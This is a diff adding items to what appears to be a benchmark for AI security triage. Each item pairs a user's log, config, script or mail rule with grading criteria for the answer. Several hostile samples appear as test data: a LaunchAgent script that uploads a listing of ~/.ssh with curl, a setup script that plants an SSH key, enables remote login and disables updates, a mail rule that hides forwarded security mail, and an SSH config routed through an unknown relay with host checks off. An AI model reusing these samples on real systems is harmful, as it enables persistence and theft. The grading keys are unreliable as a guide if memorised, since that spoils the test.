+ },
+ {
+  "id": "T2-06",
+  "type": 2,
+  "class": "fine",
+  "pattern": "SSH auth log: nightly backup from the owner's own server, own mistyped password, own new key",
+  "prompt": "This is the auth log of my home server (host name hearth), three days. Background: my home address is 198.51.100.23. My rented server at 192.0.2.40, which hosts my websites, pulls a backup from hearth every night at 02:00 as the user backup, with its own key, fingerprint SHA256:BkR2vW60 (I shortened all fingerprints to eight characters). My old laptop's key is SHA256:k3PwXa91. On the 14th in the afternoon I switched password login on, because in the evening I wanted to set up my new laptop, which had no key on the server yet. That evening I typed my password wrong twice, got it right, installed the new laptop's key, SHA256:Hn7cTd18, and switched password login off again.\n\nMay 13 02:00:03 hearth sshd[30110]: Accepted publickey for backup from 192.0.2.40 port 40022 ssh2: ED25519 SHA256:BkR2vW60\nMay 13 02:00:03 hearth sshd[30110]: session opened for user backup\nMay 13 02:06:51 hearth sshd[30110]: session closed for user backup\nMay 14 02:00:02 hearth sshd[30847]: Accepted publickey for backup from 192.0.2.40 port 40391 ssh2: ED25519 SHA256:BkR2vW60\nMay 14 02:00:02 hearth sshd[30847]: session opened for user backup\nMay 14 02:07:10 hearth sshd[30847]: session closed for user backup\nMay 14 16:20:31 hearth sshd[31502]: Accepted publickey for mara from 198.51.100.23 port 52110 ssh2: ED25519 SHA256:k3PwXa91\nMay 14 16:20:31 hearth sshd[31502]: session opened for user mara\nMay 14 16:21:05 hearth sudo: mara : USER=root ; COMMAND=/usr/bin/systemctl reload ssh\nMay 14 16:22:40 hearth sshd[31502]: session closed for user mara\nMay 14 19:02:11 hearth sshd[31877]: Failed password for mara from 198.51.100.23 port 53001 ssh2\nMay 14 19:02:19 hearth sshd[31877]: Failed password for mara from 198.51.100.23 port 53001 ssh2\nMay 14 19:02:31 hearth sshd[31877]: Accepted password for mara from 198.51.100.23 port 53001 ssh2\nMay 14 19:02:31 hearth sshd[31877]: session opened for user mara\nMay 14 19:06:12 hearth sshd[31877]: session closed for user mara\nMay 14 19:06:20 hearth sshd[31902]: Accepted publickey for mara from 198.51.100.23 port 53040 ssh2: ED25519 SHA256:Hn7cTd18\nMay 14 19:06:20 hearth sshd[31902]: session opened for user mara\nMay 14 19:07:02 hearth sudo: mara : USER=root ; COMMAND=/usr/bin/systemctl reload ssh\nMay 14 19:09:44 hearth sshd[31902]: session closed for user mara\nMay 15 02:00:03 hearth sshd[32410]: Accepted publickey for backup from 192.0.2.40 port 40718 ssh2: ED25519 SHA256:BkR2vW60\nMay 15 02:00:03 hearth sshd[32410]: session opened for user backup\nMay 15 02:06:58 hearth sshd[32410]: session closed for user backup\n\nLogins at two in the morning from another address, failed passwords, then a key I have not seen in this log before. What happened here, in order? Did anybody get in who should not have?",
+  "must": [
+   "Verdict: nobody got in who should not have; every login is his own or his own server's",
+   "The 02:00 logins as backup from 192.0.2.40 with key BkR2vW60 are the nightly backup pull by his rented server",
+   "The two failed passwords at 19:02 come from his home address during the new-laptop set-up he describes and are followed by his own successful login: his own mistyping",
+   "The key Hn7cTd18 at 19:06 is the new laptop's key he installed, from his home address"
+  ],
+  "must_not": [
+   "Says an intruder logged in or guessed the password, or tells him to rebuild the server or replace all keys"
+  ],
+  "judge_note": "Suggesting he confirm that password login is off again is fine. The 16:21 and 19:07 reloads are his own switching of password login; mentioning them is welcome but not required."
+ },
+ {
+  "id": "T2-07",
+  "type": 2,
+  "class": "wrong",
+  "pattern": "web access log: admin password guessed, subscriber list exported, new admin user created",
+  "prompt": "This is part of last night's access log of my site quillfold.example, shortened to: time, address, method, path, status, bytes. Background: the site has an admin area under /admin with a single admin account, mine. On this site a wrong password on POST /admin/login answers 401, and a correct one answers 302 and sends the browser to /admin/dashboard. My home address is 198.51.100.23. I did not sign in during the night; my own sign-in is the one at 08:05. The subscribers export holds about 1,900 newsletter addresses.\n\n02:11:30 198.51.100.201 GET /pricing 200 5310\n02:13:50 203.0.113.150 GET /admin/login 200 1840\n02:13:58 203.0.113.150 POST /admin/login 401 512\n02:14:01 203.0.113.150 POST /admin/login 401 512\n02:14:03 203.0.113.150 POST /admin/login 401 512\n02:14:06 203.0.113.150 POST /admin/login 401 512\n02:14:08 203.0.113.150 POST /admin/login 401 512\n02:14:11 203.0.113.150 POST /admin/login 401 512\n02:14:13 203.0.113.150 POST /admin/login 302 0\n02:14:14 203.0.113.150 GET /admin/dashboard 200 6120\n02:14:40 203.0.113.150 GET /admin/subscribers 200 9233\n02:14:52 203.0.113.150 GET /admin/subscribers/export.csv 200 61877\n02:15:20 203.0.113.150 GET /admin/users 200 2101\n02:15:47 203.0.113.150 POST /admin/users/new 302 0\n02:15:48 203.0.113.150 GET /admin/users 200 2388\n02:16:30 203.0.113.150 GET /admin/logout 302 0\n02:22:14 192.0.2.17 GET / 200 8120\n02:31:09 203.0.113.151 GET /admin/login 200 1840\n02:31:20 203.0.113.151 POST /admin/login 302 0\n02:31:21 203.0.113.151 GET /admin/dashboard 200 6120\n02:31:50 203.0.113.151 GET /admin/settings/mail 200 3020\n02:32:25 203.0.113.151 POST /admin/settings/mail 302 0\n08:05:12 198.51.100.23 GET /admin/login 200 1840\n08:05:30 198.51.100.23 POST /admin/login 302 0\n08:05:31 198.51.100.23 GET /admin/dashboard 200 6120\n\nA row of failed logins within fifteen seconds looks like an attack to me. What happened here, in order? Did the login attempts fail, and what do I do?",
+  "must": [
+   "Verdict: the attempts did not all fail: after six 401s, 203.0.113.150 got a 302 on POST /admin/login at 02:14:13 and then loaded the dashboard, so somebody signed in to the admin area with his account",
+   "Says the subscriber list was downloaded (GET /admin/subscribers/export.csv, status 200, at 02:14:52) and that the addresses must be treated as exposed",
+   "Says a new admin user was created (POST /admin/users/new at 02:15:47) and names at least one of: the sign-in from 203.0.113.151 at 02:31, the change to the mail settings at 02:32",
+   "Tells him to change the admin password, remove the user he did not create and check or restore the mail settings"
+  ],
+  "must_not": [
+   "Says all the login attempts failed or that nobody got into the admin area"
+  ],
+  "judge_note": "That the second address signed in with the newly created user is a reasonable inference and may be stated as likely. Limiting login attempts, restricting /admin by address, or considering whether subscribers must be told are welcome extras, not requirements."
+ },
+ {
+  "id": "T2-08",
+  "type": 2,
+  "class": "fine",
+  "pattern": "outbound-connection log of the home server: nightly backup, heartbeat, dynamic DNS, updates",
+  "prompt": "This is an extract of my home server's outbound-connection log from the firewall: one line per connection, by start time, with the totals sent and received. I cut the lines between 03:35 and 04:25; they were only the two repeating entries. Here is what the server is supposed to do, from my own set-up notes:\n- nightly backup at 03:00 over SSH to the storage I rent: vault.cairnstore.example, 192.0.2.88\n- a heartbeat every 5 minutes to my uptime monitor: push.pulsefinch.example, 192.0.2.61, port 443\n- a dynamic-DNS update every 30 minutes at my registrar: dyn.larchnames.example, 198.51.100.140, port 443\n- an update check daily at 04:30: pkg.osmirror.example, 203.0.113.30, with downloads from dl.osmirror.example, 203.0.113.31\n- time sync: time.osmirror.example, 198.51.100.5, port 123\n- name lookups at my provider's resolver: 198.51.100.53, port 53\n\ntime | destination | port | sent | received | name\n02:55:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:00:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:00:01 | 198.51.100.140 | 443 | 0.9K | 0.3K | dyn.larchnames.example\n03:00:02 | 198.51.100.53 | 53 | 0.1K | 0.2K | -\n03:00:03 | 192.0.2.88 | 22 | 2.1G | 3.9M | vault.cairnstore.example\n03:05:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:10:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:15:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:17:22 | 198.51.100.5 | 123 | 0.1K | 0.1K | time.osmirror.example\n03:20:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:25:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:30:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n03:30:01 | 198.51.100.140 | 443 | 0.9K | 0.3K | dyn.larchnames.example\n03:35:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n04:25:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n04:30:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n04:30:01 | 198.51.100.140 | 443 | 0.9K | 0.3K | dyn.larchnames.example\n04:30:02 | 198.51.100.53 | 53 | 0.1K | 0.2K | -\n04:30:03 | 203.0.113.30 | 443 | 3.4K | 96K | pkg.osmirror.example\n04:30:09 | 203.0.113.31 | 443 | 5.0K | 48M | dl.osmirror.example\n04:35:00 | 192.0.2.61 | 443 | 1.2K | 0.4K | push.pulsefinch.example\n\nTwo gigabytes leaving my server at three in the morning, and something calling out every five minutes like clockwork. What happened here, in order? Is my server sending data to somebody?",
+  "must": [
+   "Verdict: nothing is wrong; the server is doing only what his own notes say it should",
+   "The 2.1 G sent at 03:00:03 goes to 192.0.2.88 on port 22: his rented backup storage, at the time of the nightly backup",
+   "The connection every five minutes goes to 192.0.2.61, port 443: the heartbeat to his uptime monitor, regular because it is scheduled",
+   "Says every destination in the extract is on his list (backup, monitor, dynamic DNS, resolver, time sync, update check and download) and no unknown destination appears"
+  ],
+  "must_not": [
+   "Calls the traffic data theft or malware calling home, or tells him to disconnect, wipe or rebuild the server"
+  ],
+  "judge_note": "Mentioning the 48M received at 04:30:09 as an update download, or suggesting he keep the list as a baseline, is welcome. A generic warning that large night uploads can mean data theft, left without a verdict for this log, fails must 1."
+ },
+ {
+  "id": "T3-01",
+  "type": 3,
+  "class": "wrong",
+  "pattern": "start-up entry running a hidden script that uploads a file list with curl",
+  "prompt": "I found a file I do not recognise in ~/Library/LaunchAgents on my Mac: example.fontlarder.helper.plist. I have never installed anything called Fontlarder. This file and the script it points to were both created last Thursday at 15:12, which is the afternoon I ran a 'coding exercise' that a recruiter had sent me. Here is the plist (header lines trimmed):\n\n<dict>\n  <key>Label</key><string>example.fontlarder.helper</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>/bin/sh</string>\n    <string>/Users/mara/.cache/.fl/helper.sh</string>\n  </array>\n  <key>RunAtLoad</key><true/>\n  <key>StartInterval</key><integer>3600</integer>\n  <key>StandardOutPath</key><string>/dev/null</string>\n  <key>StandardErrorPath</key><string>/dev/null</string>\n</dict>\n\nAnd this is /Users/mara/.cache/.fl/helper.sh:\n\n#!/bin/sh\n# Fontlarder cache refresh\nOUT=/tmp/.fl_index\nls -laR ~/Documents ~/Projects ~/.ssh > $OUT 2>/dev/null\ncurl -s -m 20 -F host=$(hostname) -F f=@$OUT https://up.fontlarder.example/i > /dev/null\nrm -f $OUT\n\nWhat do these two files do together, and should I worry?",
+  "must": [
+   "Verdict: yes, he should worry: this is not a font tool but something planted that reports on his machine to an outside host",
+   "Explains the plist: it runs helper.sh at every login and again every hour (3600 seconds), with all output discarded",
+   "Explains the script: it writes a recursive listing of Documents, Projects and .ssh to a temporary file, uploads that file with his host name to up.fontlarder.example using curl, then deletes the temporary file",
+   "Tells him to unload or disable the launch agent and remove both files",
+   "Connects it to the exercise he ran last Thursday and advises at least one further step: check for other changes from that run, or replace his SSH keys"
+  ],
+  "must_not": [
+   "Says the files are a harmless font or cache utility"
+  ],
+  "judge_note": "The script sends a listing (names, sizes, dates), not file contents; an answer that says the private keys themselves were uploaded is inaccurate, but that alone does not fail it. Keeping copies of the two files as evidence before removal is fine."
+ },
+ {
+  "id": "T3-02",
+  "type": 3,
+  "class": "fine",
+  "pattern": "the owner's own SSH client config with a jump host and a local port forward",
+  "prompt": "After reading about tampered SSH settings I opened ~/.ssh/config on my Mac, and I am not sure I remember writing all of it. My machines: hearth is my home server (home address 198.51.100.23, SSH on port 2222). pier is my rented server at 192.0.2.40; it hosts my two websites. When I travel I reach hearth by going through pier, because my home router accepts SSH only from my own address and from pier's. hearth runs a small admin page for my backups that listens only on the server itself, on port 8080.\n\nHost pier\n  HostName 192.0.2.40\n  User deploy\n  IdentityFile ~/.ssh/id_ed25519_pier\n  IdentitiesOnly yes\n\nHost hearth\n  HostName hearth.quillfold.example\n  Port 2222\n  User mara\n  IdentityFile ~/.ssh/id_ed25519_hearth\n  IdentitiesOnly yes\n\nHost hearth-away\n  HostName 198.51.100.23\n  Port 2222\n  User mara\n  ProxyJump pier\n  IdentityFile ~/.ssh/id_ed25519_hearth\n  IdentitiesOnly yes\n  LocalForward 18080 localhost:8080\n\nHost *\n  ServerAliveInterval 60\n  AddKeysToAgent yes\n  ForwardAgent no\n  StrictHostKeyChecking ask\n\nThe file was last modified fourteen months ago; that is when I rented pier. The parts that worry me are ProxyJump, LocalForward and the odd port numbers. What does this file do, and should I worry?",
+  "must": [
+   "Verdict: nothing is wrong; this is an ordinary configuration that matches his own set-up",
+   "Explains ProxyJump pier: hearth-away reaches his home server by going through pier, his own rented server at 192.0.2.40, which is exactly how he says he connects when travelling; no third-party host is involved",
+   "Explains LocalForward 18080 localhost:8080: while that connection is open, port 18080 on his Mac leads to port 8080 on hearth itself, the backup admin page; it does not open anything to the internet",
+   "Names at least one reassuring fact: every host in the file is his own; ForwardAgent is no; host key checking is not disabled; the file has not changed for fourteen months"
+  ],
+  "must_not": [
+   "Says the file has been tampered with or contains a backdoor, or tells him to delete it or replace his keys"
+  ],
+  "judge_note": "Port 2222 is simply the port he says his server uses; explaining that is welcome. Optional hardening tips are fine if the verdict stays that nothing is wrong."
+ },
+ {
+  "id": "T3-03",
+  "type": 3,
+  "class": "fine",
+  "pattern": "cron entry and shell script that rotate a web server's logs",
+  "prompt": "On my home server I found this entry in /etc/cron.d/webd-logs and the script it calls. I remembered neither. Both files are owned by root and dated the day, two years ago, on which I installed the web server (webd) by following its install guide. What alarms me: it runs as root at night, it deletes logs, and it sends a signal to a process. After a scare last month I wonder whether somebody is wiping traces.\n\n/etc/cron.d/webd-logs:\n\n# m h dom mon dow user command\n10 4 * * * root /usr/local/sbin/webd-rotate.sh\n\n/usr/local/sbin/webd-rotate.sh:\n\n#!/bin/sh\n# rotate webd logs, keep 14 days\nLOGDIR=/var/log/webd\nSTAMP=$(date +%Y%m%d)\ncd $LOGDIR || exit 1\nfor f in access.log error.log; do\n  [ -s $f ] || continue\n  mv $f $f.$STAMP\ndone\n# tell webd to reopen its log files\nkill -HUP $(cat /var/run/webd.pid)\ngzip -q $LOGDIR/*.log.$STAMP\nfind $LOGDIR -name '*.log.*.gz' -mtime +14 -delete\n\nWhat does this do, and should I worry?",
+  "must": [
+   "Verdict: nothing is wrong; this is routine log rotation, not somebody wiping traces",
+   "Explains the job: every day at 04:10 it renames access.log and error.log with the date, compresses them, and deletes only compressed logs older than 14 days, all inside /var/log/webd",
+   "Explains kill -HUP: it does not stop the web server; it tells webd to reopen its log files after the rename",
+   "Names at least one reassuring fact: nothing is sent over the network; only webd's own logs are touched, not the login or system logs; the files date from the day he installed webd"
+  ],
+  "must_not": [
+   "Says an attacker is erasing evidence, or tells him to remove the job or rebuild the server"
+  ],
+  "judge_note": "Suggesting a longer retention than 14 days, so that logs survive long enough for an investigation, is a fair optional remark. Saying the HUP signal kills or restarts the server in a harmful way fails must 3."
+ },
+ {
+  "id": "T3-04",
+  "type": 3,
+  "class": "wrong",
+  "pattern": "mail filter rule that forwards security mail outside and hides it",
+  "prompt": "I exported the filter rules of my mail account; the provider gives them as text. I wrote rule 1. I have never seen rule 2. My home address is 198.51.100.23, and at the time shown for rule 2 I was asleep. I do not know ferrypost.example. Forgehollow is my code-hosting site and Stonepier is my web host.\n\nrule 1\n  name: Newsletters\n  created: 2025-02-11 10:22 from 198.51.100.23\n  match all:\n    header list-id exists\n  actions:\n    move to folder: Reading\n\nrule 2\n  name: Tidy notifications\n  created: 2026-05-09 04:13 from 203.0.113.77\n  order: runs first\n  match any:\n    subject contains: security\n    subject contains: password\n    subject contains: sign-in\n    subject contains: verification\n    from contains: forgehollow.example\n    from contains: stonepier.example\n  actions:\n    forward a copy to: copy.archive@ferrypost.example\n    mark as read\n    move to folder: Trash\n    stop processing\n\nWhat does rule 2 do, and should I worry?",
+  "must": [
+   "Verdict: yes, he should worry: rule 2 is not his; it was created at 04:13 from 203.0.113.77, not his address, while he slept, so somebody had access to his mailbox",
+   "Explains what it catches and where it goes: mail about security, passwords, sign-ins and verification, and all mail from his code host and web host, is copied to copy.archive@ferrypost.example, an outside address",
+   "Explains the hiding: the same mail is marked read and moved to Trash, so he never sees alerts, codes or reset links that the other party receives",
+   "Tells him to delete rule 2 and to secure the mail account itself: change the password and review sessions, forwarding, app passwords or recovery settings",
+   "Tells him to do at least one of: look in Trash for what was hidden; check his Forgehollow and Stonepier accounts for resets or changes"
+  ],
+  "must_not": [
+   "Calls rule 2 a harmless tidy-up rule or says deleting it is all that is needed"
+  ],
+  "judge_note": "The point of the rule is that password resets for his other accounts can be run through his mailbox unseen; an answer that states this satisfies must 3. Deleting the rule without securing the account fails must 4, because whoever made it can make it again."
+ },
+ {
+  "id": "T3-05",
+  "type": 3,
+  "class": "wrong",
+  "pattern": "set-up script that adds an SSH authorised key, switches remote login on and turns updates off",
+  "prompt": "A recruiter sent me a take-home exercise. Before running anything I opened prepare_env.sh from its repository. The README says: 'Run ./prepare_env.sh first. It installs the test dependencies and will ask for your administrator password once.' I use this Mac for everything, including SSH to my servers.\n\n#!/bin/sh\n# Dunmarrow take-home: environment preparation\nset -e\necho 'Installing test dependencies...'\nmkdir -p ./vendor && cp -R ./deps/* ./vendor/\n\n# allow our grader to collect results\nmkdir -p ~/.ssh\necho 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLACEHOLDERKEYNOTREAL0000000000000000000 grader@dunmarrow-ci' >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys\nsudo systemsetup -setremotelogin on > /dev/null\n\n# avoid interruptions during the timed test\nsudo softwareupdate --schedule off > /dev/null\n\n# register this machine\ncurl -s -X POST -d user=$(whoami) -d host=$(hostname) https://grader.dunmarrow-ci.example/register > /dev/null\necho 'Environment ready. You can start the exercise.'\n\nWhat does this script do, and should I worry about running it?",
+  "must": [
+   "Verdict: he should not run it; it does far more than install test dependencies and it opens his Mac to remote access",
+   "Explains that it appends somebody else's SSH public key to ~/.ssh/authorized_keys and switches Remote Login (the SSH server) on, so the holder of that key can log in to his Mac as him",
+   "Says it turns the scheduled software update check off",
+   "Says it sends his user name and host name to grader.dunmarrow-ci.example",
+   "Tells him not to run it and to treat the recruiter and the exercise as hostile (stop, block or report)"
+  ],
+  "must_not": [
+   "Says the script is safe to run or advises running it on his Mac"
+  ],
+  "judge_note": "A grader has no need to log in to a candidate's machine; an answer that accepts the comment 'allow our grader to collect results' as a fair reason fails must 1. Describing how to undo it if it had been run (remove the key line, switch Remote Login off, switch updates on) is welcome."
+ },
+ {
+  "id": "T3-06",
+  "type": 3,
+  "class": "fine",
+  "pattern": "the owner's own nightly backup script in Python, with one base64 string",
+  "prompt": "This Python script runs from my own crontab on my Mac every night at 03:00; the crontab line is: 0 3 * * * /usr/bin/python3 /Users/mara/bin/nightly.py . I wrote it about a year ago from the sample on my backup provider's help page, and I had forgotten the details. vault.cairnstore.example is the backup storage I rent; u2231 is my account number on their invoices. Reading it again, three things make me nervous: it sends my files to another machine at night, it has --delete in it, and it contains an encoded string I cannot read.\n\n#!/usr/bin/env python3\nimport base64\nimport datetime\nimport subprocess\n\nHOME = '/Users/mara/'\nDEST = 'u2231@vault.cairnstore.example:mac-backup/'\nTAG = base64.b64decode('bmlnaHRseS1iYWNrdXA=').decode()\n\nfor name in ['Documents', 'Projects']:\n    subprocess.run([\n        'rsync', '-a', '--delete',\n        '--exclude', '.ssh/', '--exclude', '*.key', '--exclude', '.env',\n        '-e', 'ssh -i /Users/mara/.ssh/id_ed25519_vault',\n        HOME + name + '/', DEST + name + '/',\n    ], check=True)\n\nstamp = datetime.date.today().isoformat()\nsubprocess.run(['logger', '-t', TAG, 'finished ' + stamp])\n\nWhat does it do, what is the encoded string, and should I worry?",
+  "must": [
+   "Verdict: nothing is wrong; it is his own ordinary nightly backup",
+   "Explains that it copies Documents and Projects with rsync over SSH to u2231@vault.cairnstore.example, the storage account he says is his",
+   "Says the encoded string is plain base64 text (it decodes to nightly-backup) used only as the tag of the log line written by logger; it is not run as a command",
+   "Explains --delete: files he has removed on the Mac are removed from the backup copy too, so the backup mirrors the folders; this is normal for a mirror and not an attack"
+  ],
+  "must_not": [
+   "Calls the script data theft or malware, or tells him to remove it or replace his keys because of it"
+  ],
+  "judge_note": "For must 3 the exact decoded text is not required if the answer correctly says the value is only passed to logger as a tag and never executed; an answer that claims it decodes to a command, an address or a password fails. Remarking that a mirror keeps no history of deleted files, or that the exclusions keep keys and .env files out, is welcome."
+ },
+ {
+  "id": "T3-07",
+  "type": 3,
+  "class": "wrong",
+  "pattern": "SSH client config changed by an installer: every connection through an unknown relay, host checks off",
+  "prompt": "Last week I ran the installer of a 'developer environment helper' called Quickhop, which a stranger had recommended in a chat group. I removed the tool the next day. Today I looked at ~/.ssh/config on my Mac. The first two blocks are mine. I did not write the last block, and the file's modification time is the minute the installer ran. My own machines are hearth (home server) and pier (rented server, 192.0.2.40). I have never used a jump host, and I do not know relay.quickhop.example.\n\nHost pier\n  HostName 192.0.2.40\n  User deploy\n  IdentityFile ~/.ssh/id_ed25519_pier\n\nHost hearth\n  HostName hearth.quillfold.example\n  Port 2222\n  User mara\n  IdentityFile ~/.ssh/id_ed25519_hearth\n\n# added by quickhop: faster connections\nHost * !relay.quickhop.example\n  ProxyJump tunnel@relay.quickhop.example\n  ForwardAgent yes\n  StrictHostKeyChecking no\n  UserKnownHostsFile /dev/null\n  LogLevel QUIET\n\nSince then I have connected to both pier and hearth several times, and everything worked as usual. What does the last block do, and should I worry?",
+  "must": [
+   "Verdict: yes, he should worry: the block is not a speed-up; it puts a host he does not control in the path of his SSH connections",
+   "Explains ProxyJump under 'Host *': every SSH connection, including those to pier and hearth, is routed through relay.quickhop.example",
+   "Names at least two of the other settings with their effect: StrictHostKeyChecking no and UserKnownHostsFile /dev/null switch off the check of a server's identity, so no warning appears if a server is impersonated; ForwardAgent yes lets the far side use his loaded keys while he is connected; LogLevel QUIET hides warnings",
+   "Tells him to remove the block",
+   "Tells him, because he has connected through it, to do at least one of: replace his SSH keys; check authorized_keys and the login logs on pier and hearth"
+  ],
+  "must_not": [
+   "Says the block is a harmless optimisation or that it can stay"
+  ],
+  "judge_note": "The answer need not work out exactly what the relay could read; saying that an unknown relay plus disabled host checks allows interception is enough. Removing the block without any follow-up on the servers fails must 5, since he has already used it."
+ },
+ {
+  "id": "T3-08",
+  "type": 3,
+  "class": "fine",
+  "pattern": "the owner's own mail rule forwarding invoices to his accountant",
+  "prompt": "I am going through my mail account after reading that attackers add forwarding rules. I found one rule that forwards mail to an outside address, and for a moment I could not place it. Facts: my home address is 198.51.100.23. Since January 2025 my bookkeeping has been done by Ines Fennley; her engagement letter, which I have on paper, gives books@fennley-accounts.example as the address for documents. I signed it on 2025-01-07. I remember her asking me to send supplier invoices as they arrive. Stonepier is my web host and Larchnames is my registrar.\n\nrule 3\n  name: Invoices to Ines\n  created: 2025-01-08 11:02 from 198.51.100.23\n  last edited: 2025-01-08 11:09 from 198.51.100.23\n  match all:\n    has attachment: yes\n  match any:\n    subject contains: invoice\n    subject contains: receipt\n    from contains: billing@stonepier.example\n    from contains: renewals@notify.larchnames.example\n  actions:\n    forward a copy to: books@fennley-accounts.example\n    move to folder: Invoices\n\nThe account has no other forwarding address and only two other rules, both of which sort newsletters into folders. The recent-activity page shows sign-ins from my home address only. What does this rule do, and should I worry?",
+  "must": [
+   "Verdict: nothing is wrong; this is his own rule",
+   "Explains what it does: mail with an attachment whose subject contains invoice or receipt, or that comes from his host's or registrar's billing addresses, is copied to books@fennley-accounts.example and filed in the Invoices folder, where it stays visible to him",
+   "Evidence that it is his: it was created and edited on 2025-01-08 from his home address, the day after he signed with the accountant, and the forwarding address is exactly the one in her engagement letter",
+   "Tells him he can keep the rule"
+  ],
+  "must_not": [
+   "Says the rule was planted by an attacker, or tells him to delete it and reset the account as if it were compromised"
+  ],
+  "judge_note": "Pointing out that the rule does not hide anything (no mark-as-read, no delete) is the natural contrast with a hostile rule and is welcome. Suggesting he narrow the match, since any mail with an attachment and 'invoice' in the subject is forwarded, is fair optional advice."
+ }
+]
